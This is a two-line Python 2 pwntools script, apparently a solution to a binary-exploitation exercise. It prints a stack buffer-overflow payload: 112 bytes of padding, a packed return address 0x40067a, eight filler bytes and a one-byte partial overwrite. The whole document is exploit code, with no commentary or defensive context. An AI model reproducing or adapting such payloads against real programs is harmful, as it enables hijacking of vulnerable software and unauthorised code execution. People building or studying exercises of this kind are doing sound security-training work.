from pwn import *

print  "A" * 112 + p64(0x000000000040067a) + "A"*8 + "\x28"
